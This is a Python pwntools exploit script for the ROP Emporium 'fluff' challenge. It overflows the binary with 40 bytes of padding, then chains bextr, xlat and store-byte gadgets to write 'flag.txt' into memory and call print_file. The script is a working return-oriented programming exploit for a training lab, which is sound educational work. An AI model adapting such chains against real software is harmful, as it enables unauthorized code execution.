#!/usr/bin/python3
import pwn
import sys
binary = "fluff"
pwn.context.binary = binary
pwn.context.encoding = "latin"

location_write_value = 0x601028
location_write = pwn.p64(0x601028)
location_f = pwn.p64(0x000000cd)
gadget_store_byte = pwn.p64(0x400639)
gadget_pop_rdi = pwn.p64(0x4006a3)
gadget_ret = pwn.p64(0x400295)
gadget_xlat = pwn.p64(0x400628)
gadget_bextr = pwn.p64(0x40062a)
gadget_mov_eax_0_pop_rbp = pwn.p64(0x400610)
gadget_print_file = pwn.p64(0x400510)

'''
taken from video: https://www.youtube.com/watch?v=UM6d8DPB8wo&list=PLHUKi1UlEgOKAVRdiMlpX6hgayiY6dTwu&index=7
find and build the flag string from within the binary itself
'''
elf = pwn.ELF(binary, checksec=False)
flag_string = b"flag.txt"
char_mem_addrs = []
for x in flag_string:
    # this actually adds the elf offset which is usually 0x400000 (aslr can change this)
    addr = hex(pwn.read(binary).find(x) + elf.address)
    char_mem_addrs.append(addr)
    pwn.info(f"found: \"{chr(x)}\" at address: {addr}")

'''
this encoding flag part was partially taken from this blog:
    https://mregraoncyber.com/rop-emporium-writeup-fluff/?utm_source=rss&utm_medium=rss&utm_campaign=rop-emporium-writeup-fluff
'''
# encode the flag into memory
flag_vals = b"flag.txt"
offset = 0
encode_flag = b""
current_rax = 0xb
for i in range(0, 8):
    if i != 0:
        current_rax = flag_vals[i-1]
    encode_flag += gadget_bextr
    encode_flag += pwn.p64(0x4000)
    encode_flag += pwn.p64(int(char_mem_addrs[i], 16) - current_rax - 0x3ef2)
    encode_flag += gadget_xlat
    encode_flag += gadget_pop_rdi
    encode_flag += pwn.p64(location_write_value + i) 
    encode_flag += gadget_store_byte  

padding = 40
payload = pwn.flat(
    b"A"*padding,
    encode_flag,
    gadget_pop_rdi,
    location_write,
    gadget_print_file
)

if ("input" in sys.argv):
    with open("input", "wb") as io:
        io.write(payload)

if ("log" in sys.argv):
    pwn.context.log_level = "debug"

with pwn.process(binary) as io:
    pwn.info(io.readrepeat(1))
    io.send(payload)

    if ("interactive" in sys.argv):
        io.interactive()

    if ("output" in sys.argv):
        pwn.info(io.readrepeat(1))
